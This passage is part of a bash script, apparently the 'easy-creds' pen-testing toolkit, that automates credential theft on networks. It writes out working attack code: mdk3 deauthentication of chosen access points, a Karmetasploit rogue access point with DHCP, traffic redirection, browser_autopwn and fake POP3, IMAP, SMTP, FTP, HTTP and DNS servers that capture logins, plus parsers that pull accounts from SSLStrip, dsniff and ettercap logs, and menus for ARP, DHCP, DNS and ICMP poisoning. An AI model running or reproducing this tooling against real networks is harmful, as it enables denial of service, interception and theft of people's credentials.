sleep 10
}
##################################################
f_getbssids(){
clear
f_Banner

printf "This will launch airodump-ng and allow you to specify the AP to DoS\n\n"

airmon-ng | grep wlan

printf "\nPlease enter the wireless device to use: "
read -e airowlan

printf "\nPlacing the wireless card in monitor mode to start airodump-ng.\n"
airmon-ng start $airowlan &> /dev/null
sleep 3

airmon-ng | grep mon

printf "\nPlease enter the device to perform the attack from (i.e. mon1): "
read -e airomon

printf "\nStarting airodump-ng, this will run for 5 minutes and provide you a list of ESSIDs to attack.\n"
xterm -geometry 90x25+0+0 -T "Airodump" -e airodump-ng $airomon -w /tmp/airodump-ec --output-format csv &
echo $! > /tmp/airodump-pid
sleep 1m && kill $(cat /tmp/airodump-pid)

#sometimes the mon interface doesn't transition properly after airodump, decided to stop the interface and restart it clean
airmon-ng stop $airomon &> /dev/null

printf "\nThe following APs were identified:\n"

#IFS variable allows for spaces in the name of the ESSIDs and will still display it on one line 
SAVEIFS=$IFS
IFS=$(echo -en "\n\b")
for apname in $(cat /tmp/airodump-ec-01.csv | egrep -a '(OPN|MGT|WEP|WPA)'| cut -d "," -f14| sort -u);do
        echo [*] "$apname"
done
IFS=$SAVEIFS

printf "\nPlease enter the ESSID you'd like to attack: "
read -e dosapname
cat /tmp/airodump-ec-01.csv | egrep -a '(OPN|MGT|WEP|WPA)'| grep -a -i $dosapname |cut -d "," -f1 > /tmp/ec-macs
rm /tmp/airodump-ec*

#Make sure none of your MACs end up in the blacklist
diff -i /tmp/ec-macs /tmp/ec-white.lst | grep -v ">"|grep -o -E '([[:xdigit:]]{1,2}:){5}[[:xdigit:]]{1,2}' > /tmp/ec-dosap

printf "\nNow Deauthing clients from $dosapname.\n\nIf there is more than one BSSID, all will be attacked...\n"
airmon-ng start $airowlan &> /dev/null
sleep 3

xterm -geometry 70x10+0-0 -T "MDK3 AP DoS" -e mdk3 $airomon d -b /tmp/ec-dosap &

printf "\nPlease close the xterm window to stop the attack..."
sleep 5
}

##################################################
f_KarmaAttack(){

wireless=1
karmasploit=1

# Credit to Metasploit Unleashed, used as a base
clear
f_Banner

# xterm window variables
x="0"					# x offset value
y="0"					# y offset value
width="100"				# width value
height="7"				# height value
yoffset="120"				# y offset

printf "Network Interfaces:\n"
ifconfig | grep Link
printf "Interface connected to the internet, example eth0: "
read -e IFACE

if [ -z $IFACE ]; then
	f_Error
	f_KarmaAttack
fi

airmon-ng

printf "Wireless interface name, example wlan0: "
read -e WIFACE

if [ -z $WIFACE ]; then
	f_Error
	f_KarmaAttack
fi

airmon-ng start $WIFACE &> /dev/null

modprobe tun

printf "\n*** Your interface has now been placed in Monitor Mode ***\n"
airmon-ng | grep mon
printf "\nEnter your monitor enabled interface name, example mon0: "
read -e MONMODE

if [ -z $MONMODE ]; then
	f_Error
	f_KarmaAttack
fi

printf "Enter your tunnel interface, example at0: "
read -e TUNIFACE

if [ -z $TUNIFACE ]; then
	f_Error
	f_KarmaAttack
fi

sleep 3

f_karmadhcp
f_karmasetup
f_karmafinal
}

##################################################
f_karmadhcp(){
  DHCPPATH=/etc/dhcp3/dhcpd-karma.conf

  printf "Network range for your tunneled interface, example 10.0.0.0/24: "
  read -e ATCIDR  
  if [ -z "$ATCIDR" ]; then
	  f_Error
	  f_dhcpmanual
  fi

  printf "Enter the IP address for the DNS server, example 8.8.8.8: "
  read -e ATDNS

  if [ -z $ATDNS ]; then
	  f_Error
	  f_dhcpmanual
  fi

#use ipcalc to complete the DHCP setup
ipcalc "$ATCIDR" > /tmp/atcidr
ATNET=$(cat /tmp/atcidr|grep Address| grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}')
ATIP=$(cat /tmp/atcidr|grep HostMin| grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}')
ATSUB=$(cat /tmp/atcidr|grep Netmask| grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}')
ATBROAD=$(cat /tmp/atcidr|grep Broadcast| grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}')
ATLSTARTTMP=$(cat /tmp/atcidr|grep HostMin| grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}'|cut -d"." -f1-3)
ATLSTART=$(echo $ATLSTARTTMP.100)
ATLENDTMP=$(cat /tmp/atcidr|grep HostMax| grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}'|cut -d"." -f1-3)
ATLEND=$(echo $ATLENDTMP.200)

printf "Creating a dhcpd.conf to assign addresses to clients that connect to us.\n"
echo "ddns-update-style none;" > /etc/dhcp3/dhcpd-karma.conf
echo "authoritative;"  >> /etc/dhcp3/dhcpd-karma.conf
echo "log-facility local7;"  >> /etc/dhcp3/dhcpd-karma.conf
echo "subnet $ATNET netmask $ATSUB {"  >> /etc/dhcp3/dhcpd-karma.conf
echo "	range $ATLSTART $ATLEND;"  >> /etc/dhcp3/dhcpd-karma.conf
echo "	option domain-name-servers $ATIP;"  >> /etc/dhcp3/dhcpd-karma.conf
echo "	option routers $ATIP;"  >> /etc/dhcp3/dhcpd-karma.conf
echo "	option broadcast-address $ATBROAD;"  >> /etc/dhcp3/dhcpd-karma.conf
echo "	default-lease-time 600;" >> /etc/dhcp3/dhcpd-karma.conf
echo "	max-lease-time 7200;"  >> /etc/dhcp3/dhcpd-karma.conf
echo "}" >> /etc/dhcp3/dhcpd-karma.conf
}

##################################################
f_karmasetup(){

printf "Enter the password for the mysql root user [toor]: "
read -e MYSPWD

if [ -z $MYSPWD ]; then
  MYSPWD=toor
fi

printf "Enter the listening port for the mysql server [3306]: "
read -e MYSPORT

if [ -z $MYSPORT ]; then
  MYSPORT=3306
fi

msfmysql=1

service mysql start &> /dev/null
sleep 3

echo "db_driver mysql" > /tmp/karma.rc
echo "db_connect root:$MYSPWD@127.0.0.1:$MYSPORT/msfbook" >> /tmp/karma.rc
echo "use auxiliary/server/browser_autopwn" >> /tmp/karma.rc
echo "setg AUTOPWN_HOST $ATIP" >> /tmp/karma.rc
echo "setg AUTOPWN_PORT 55550" >> /tmp/karma.rc
echo "setg AUTOPWN_URI /ads" >> /tmp/karma.rc
echo "set LHOST $ATIP" >> /tmp/karma.rc
echo "set LPORT 45000" >> /tmp/karma.rc
echo "set SRVPORT 55550" >> /tmp/karma.rc
echo "set URIPATH /ads" >> /tmp/karma.rc
echo "run" >> /tmp/karma.rc
echo "use auxiliary/server/capture/pop3" >> /tmp/karma.rc
echo "set SRVPORT 110" >> /tmp/karma.rc
echo "set SSL false" >> /tmp/karma.rc
echo "run" >> /tmp/karma.rc
echo "use auxiliary/server/capture/pop3" >> /tmp/karma.rc
echo "set SRVPORT 995" >> /tmp/karma.rc
echo "set SSL true" >> /tmp/karma.rc
echo "run" >> /tmp/karma.rc
echo "use auxiliary/server/capture/ftp" >> /tmp/karma.rc
echo "run" >> /tmp/karma.rc
echo "use auxiliary/server/capture/imap" >> /tmp/karma.rc
echo "set SSL false" >> /tmp/karma.rc
echo "set SRVPORT 143" >> /tmp/karma.rc
echo "run" >> /tmp/karma.rc
echo "use auxiliary/server/capture/imap" >> /tmp/karma.rc
echo "set SSL true" >> /tmp/karma.rc
echo "set SRVPORT 993" >> /tmp/karma.rc
echo "run" >> /tmp/karma.rc
echo "use auxiliary/server/capture/smtp" >> /tmp/karma.rc
echo "set SSL false" >> /tmp/karma.rc
echo "set SRVPORT 25" >> /tmp/karma.rc
echo "run" >> /tmp/karma.rc
echo "use auxiliary/server/capture/smtp" >> /tmp/karma.rc
echo "set SSL true" >> /tmp/karma.rc
echo "set SRVPORT 465" >> /tmp/karma.rc
echo "run" >> /tmp/karma.rc
echo "use auxiliary/server/fakedns" >> /tmp/karma.rc
echo "unset TARGETHOST" >> /tmp/karma.rc
echo "set SRVPORT 5353" >> /tmp/karma.rc
echo "run" >> /tmp/karma.rc
echo "use auxiliary/server/fakedns" >> /tmp/karma.rc
echo "unset TARGETHOST" >> /tmp/karma.rc
echo "set SRVPORT 53" >> /tmp/karma.rc
echo "run" >> /tmp/karma.rc
echo "use auxiliary/server/capture/http" >> /tmp/karma.rc
echo "set SRVPORT 80" >> /tmp/karma.rc
echo "set SSL false" >> /tmp/karma.rc
echo "run" >> /tmp/karma.rc
echo "use auxiliary/server/capture/http" >> /tmp/karma.rc
echo "set SRVPORT 8080" >> /tmp/karma.rc
echo "set SSL false" >> /tmp/karma.rc
echo "run" >> /tmp/karma.rc
echo "use auxiliary/server/capture/http" >> /tmp/karma.rc
echo "set SRVPORT 443" >> /tmp/karma.rc
echo "set SSL true" >> /tmp/karma.rc
echo "run" >> /tmp/karma.rc
echo "use auxiliary/server/capture/http" >> /tmp/karma.rc
echo "set SRVPORT 8443" >> /tmp/karma.rc
echo "set SSL true" >> /tmp/karma.rc
echo "run" >> /tmp/karma.rc
}

##################################################
f_karmafinal(){

printf "\nLaunching Airbase\n"
# airbase-ng is going to create our fake AP with the SSID default
xterm -geometry "$width"x$height-$x+$y -T "Airbase-NG" -e airbase-ng -P -C 60 -e "default" $MONMODE &
echo $! > /tmp/ec-karma-pid
sleep 7

printf "\nConfiguring tunneled interface.\n"
ifconfig $TUNIFACE up
ifconfig $TUNIFACE $ATIP netmask $ATSUB
ifconfig $TUNIFACE mtu 1400
route add -net $ATNET netmask $ATSUB gw $ATIP dev $TUNIFACE
sleep 2

printf "\nSetting up iptables to handle traffic seen by the tunneled interface.\n"
iptables --flush
iptables --table nat --flush
iptables --delete-chain
iptables --table nat --delete-chain
iptables -P FORWARD ACCEPT
iptables -t nat -A POSTROUTING -o $IFACE -j MASQUERADE

#Blackhole Routing - Forces clients to go through attacker even if they have cached DNS entries
iptables -t nat -A PREROUTING -i $TUNIFACE -j REDIRECT
sleep 2

printf "\nLaunching Tail.\n"
y=$(($y+$yoffset))
xterm -geometry "$width"x$height-$x+$y -T "DMESG" -bg black -fg red -e tail -f /var/log/messages &
sleep 3

printf "\nDHCP server starting on tunneled interface.\n"
dhcpd3 -q -cf $DHCPPATH -pf /var/run/dhcp3-server/dhcpd.pid $TUNIFACE &
sleep 3

printf "\nLaunching Karmetasploit...this may take a little bit.\n"
y=$(($y+$yoffset))
xterm -geometry "$width"x$height-$x+$y -bg black -fg white -T "Karmetasploit" -e msfconsole -r /tmp/karma.rc &
echo $! > /tmp/ec-metasploit-pid
sleep 3

#Enable IP forwarding
echo "1" > /proc/sys/net/ipv4/ip_forward

printf "\nTime to make it rain!  Enjoy!"
sleep 5
}

##################################################
#
# DATA REVIEW FUNCTIONS
#
##################################################
f_SSLStrip(){
clear
f_Banner

# Coded with help from 'Crusty Old Fart' - Ubuntu Forums
printf "Enter the full path to your SSLStrip log file: "
read -e LOGPATH

if [ -z $LOGPATH ]; then
	f_Error
	f_SSLStrip
fi

if [ ! -f $LOGPATH ]; then
	f_WrongPath
	f_SSLStrip
fi

printf "Enter the full path to your definitions file: "
read -e DEFS

if [ -z $DEFS ]; then
	f_Error
	f_SSLStrip
fi

if [ ! -f $DEFS ]; then
	f_WrongPath
	f_SSLStrip
fi

NUMLINES=$(cat "$DEFS" | wc -l)
i=1

while [ $i -le $NUMLINES ]; do
	VAL1=$(awk -v k=$i 'FNR == k {print $1}' "$DEFS")
	VAL2=$(awk -v k=$i 'FNR == k {print $2}' "$DEFS")
	VAL3=$(awk -v k=$i 'FNR == k {print $3}' "$DEFS")
	VAL4=$(awk -v k=$i 'FNR == k {print $4}' "$DEFS")
	GREPSTR="$(grep -a $VAL2 "$LOGPATH" | grep -a $VAL3 | grep -a $VAL4)"
  
	if [ "$GREPSTR" ]; then
		echo -n "$VAL1" "- " >> /$PWD/strip-accts.txt
		echo "$GREPSTR" | \
		sed -e 's/.*'$VAL3'=/'$VAL3'=/' -e 's/&/ /' -e 's/&.*//' >> /$PWD/strip-accts.txt
	fi
  
	i=$[$i+1]
done

xterm -geometry 80x24-0+0 -T "SSLStrip Accounts" -hold -bg white -fg black -e cat /$PWD/strip-accts.txt
}

##################################################
f_dsniff(){
clear
f_Banner

printf "Enter the full path to your dsniff Log file: "
read -e DSNIFFPATH

if [ -z $DSNIFFPATH ]; then
	f_Error
	f_dsniff
fi
if [ ! -f $DSNIFFPATH ]; then
	f_WrongPath
	f_dsniff
fi
dsniff -r $DSNIFFPATH >> /$PWD/dsniff-log.txt
xterm -hold -bg blue -fg white -geometry 80x24-0+0 -T "Dsniff Accounts" -e cat /$PWD/dsniff-log.txt 
}

##################################################
f_EtterLog(){
clear
# Call the easy-creds banner
f_Banner

printf "Enter the full path to your ettercap.eci log file: "
read -e ETTERECI

if [ -z $ETTERECI ]; then
	f_Error
	f_EtterLog
fi

if [ ! -f $ETTERECI ]; then
	f_WrongPath
	f_EtterLog
fi
etterlog -p "$ETTERECI" >> /$PWD/etterlog.txt
xterm -hold -bg blue -fg white -geometry 80x24-0+0 -T "Ettercap Accounts" -e cat /$PWD/etterlog.txt
}

##################################################
#
# MENU FUNCTIONS
#
##################################################
f_Banner(){
cat << !

######   ##    ####  #   #        ####  #####  ###### #####   ####
#       #  #  #       # #        #    # #    # #      #    # # 
#####  #    #  ####    #   ##### #      #    # #####  #    #  ####
#      ######      #   #         #      #####  #      #    #      #
#      #    # #    #   #         #    # #   #  #      #    # #    #
###### #    #  ####    #          ####  #    # ###### #####   ####

v3.6-BT5 11/08/2011
This script leverages tools for stealing credentials during a pen test.
*** At any time, ctrl+c to return to main menu ***

!
}
##################################################
f_prereqs(){

clear
f_Banner

cat << !
1.  Edit etter.conf
2.  Edit etter.dns
3.  Install dhcp3 server
4.  Install karmetasploit prereqs
5.  Add tunnel interface to dhcp3-server file
6.  Update Metasploit Framework
7.  Update Aircrack-ng
8.  Update SSLStrip
9.  Previous Menu
!

printf "\nChoice: "
read choice

case $choice in
1) f_nanoetter ;;
2) f_nanoetterdns ;;
3) f_dhcp3install ;;
4) f_karmareqs ;;
5) f_addtunnel ;;
6) f_msf-update ;;
7) f_aircrackupdate ;;
8) f_sslstrip_vercheck ;;
9) f_PrevMenu ;;

*) f_Error; f_prereqs ;;

esac
}

##################################################
f_poisoning(){
clear
f_Banner

cat << !
1.  Create Victim Host List
2.  Standard ARP Poison
3.  Oneway ARP Poison
4.  DHCP Poison
5.  DNS Poison
6.  ICMP Poison
7.  Previous Menu
!
echo
echo -n "Choice: "
read Choice

case $Choice in
1) f_HostScan ;;
2) f_Standard ;;
3) f_Oneway ;;
4) f_DHCPPoison ;;
5) f_DNSPoison ;;
6) f_ICMP ;;
7) f_PrevMenu ;;
*) f_Error; f_poisoning ;;
esac
}

##################################################
f_fakeapattacks(){
clear
f_Banner

cat << !
1.  FakeAP Attack Static
2.  FakeAP Attack EvilTwin
3.  Karmetasploit Attack
4.  DoS AP Options
5.  Previous Menu
!
echo
echo -n "Choice: "
read fapchoice

case $fapchoice in
1) f_fakeapAttack ;;
2) f_fakeapeviltwin ;;
3) f_KarmaAttack ;;
4) f_DoSOptions ;;
5) f_PrevMenu ;;
*) f_Error; f_FakeAP-Menu ;;
esac
}
######################################################
f_DoSOptions(){
clear
f_Banner

cat << !
1. Attack a Single or Multiple APs
2. Last Man Standing (Use with Caution)
3. Previous Menu
!
printf "\n"
echo -n "Choice: "
read doschoice

case $doschoice in
1) f_mdk3aps ;;
2) f_lastman ;;
3) f_fakeapattacks ;;
*) f_Error; f_DoSOptions ;;
esac
}
######################################################
f_DataReviewMenu(){
clear
f_Banner

cat << !
1.  Parse SSLStrip log for accounts
2.  Parse dsniff file for accounts
3.  Parse ettercap eci file for accounts
4.  Previous Menu
!
echo
echo -n "Choice: "
read Choice

case $Choice in
1) f_SSLStrip ;;
2) f_dsniff ;;
3) f_EtterLog ;;
4) f_PrevMenu ;;
*) f_Error; f_DataReviewMenu ;;
esac
}
##################################################
f_ICMP(){
clear
f_Banner

echo "*** If you are connected to a switch this attack won't work! ***"
echo "*** You must be able to see ALL traffic for this attack to work. ***"
echo
echo -n "Are you connected to a switch (y/n): "
read switch
cat << !
!

case $switch in
N|n) f_ICMPPoison ;;
*) f_poisoning ;;
esac
}

##################################################
while : # Loop forever
do

clear
f_Banner

cat << !
1.  Prerequisites & Configurations
2.  Poisoning Attacks
3.  FakeAP Attacks
4.  Data Review
5.  Exit
q.  Quit current poisoning session
!

printf "\nChoice: "
read choice

case $choice in
1) f_prereqs ;;
2) f_poisoning ;;
3) f_fakeapattacks ;;
4) f_DataReviewMenu ;;
5) f_Exit ;;

Q|q) f_Quit ;;

*) f_Error;;

esac

done
